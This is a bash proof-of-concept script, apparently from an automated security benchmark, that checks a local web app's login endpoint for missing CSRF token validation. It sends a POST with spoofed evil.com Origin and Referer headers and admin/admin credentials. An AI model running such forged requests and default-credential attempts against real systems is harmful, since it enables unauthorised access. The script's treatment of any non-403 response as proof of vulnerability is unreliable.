#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login endpoint by sending POST request without CSRF token from cross-origin
# Target: ./repo
# Created: 2025-11-07T18:08:39.673Z
# Session: benchmark-XBEN-091-24-mhp5xfb5

# CSRF Token Protection Bypass POC - Login Endpoint
# This script demonstrates the absence of CSRF token validation on the login endpoint
# The application accepts POST requests to /login without requiring a CSRF token

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="/login"

echo "================================================"
echo "CSRF Vulnerability POC - Login Form"
echo "================================================"
echo ""

# Step 1: Fetch the login form to check for CSRF token
echo "[*] Step 1: Fetching login form to check for CSRF token..."
echo ""

FORM_RESPONSE=$(curl -s -X GET "${TARGET_URL}${LOGIN_ENDPOINT}")
echo "[+] Form Response:"
echo "$FORM_RESPONSE"
echo ""

# Check if CSRF token is present in the form
if echo "$FORM_RESPONSE" | grep -q "csrf_token"; then
    echo "[!] CSRF token field found in form"
    TOKEN=$(echo "$FORM_RESPONSE" | grep -oP 'name="csrf_token"[^>]*value="\K[^"]+')
    echo "[+] Extracted token: $TOKEN"
else
    echo "[-] NO CSRF token field found in login form - VULNERABLE!"
fi
echo ""

# Step 2: Attempt to POST to login without CSRF token (simulating CSRF attack)
echo "[*] Step 2: Attempting POST to login endpoint without CSRF token..."
echo "[*] Simulating cross-origin request (Origin: http://evil.com)"
echo ""

CSRF_TEST=$(curl -s -w "\n%{http_code}" -X POST \
  "${TARGET_URL}${LOGIN_ENDPOINT}" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://evil.com' \
  -H 'Referer: http://evil.com/csrf' \
  -d 'username=admin&password=admin')

HTTP_CODE=$(echo "$CSRF_TEST" | tail -n 1)
RESPONSE=$(echo "$CSRF_TEST" | head -n -1)

echo "[+] HTTP Response Code: $HTTP_CODE"
echo "[+] Response Body:"
echo "$RESPONSE"
echo ""

# Step 3: Analyze results
echo "[*] Step 3: Vulnerability Analysis..."
echo ""

if [ "$HTTP_CODE" != "403" ]; then
    echo "[-] VULNERABLE: Request was accepted without CSRF token validation!"
    echo "    HTTP Status: $HTTP_CODE (Expected 403 for CSRF protection)"
    echo "    The application processed the cross-origin POST request"
    echo "    CSRF vulnerability confirmed!"
    exit 0
else
    echo "[+] PROTECTED: Request was rejected with 403 Forbidden"
    echo "    CSRF protection appears to be in place"
    exit 1
fi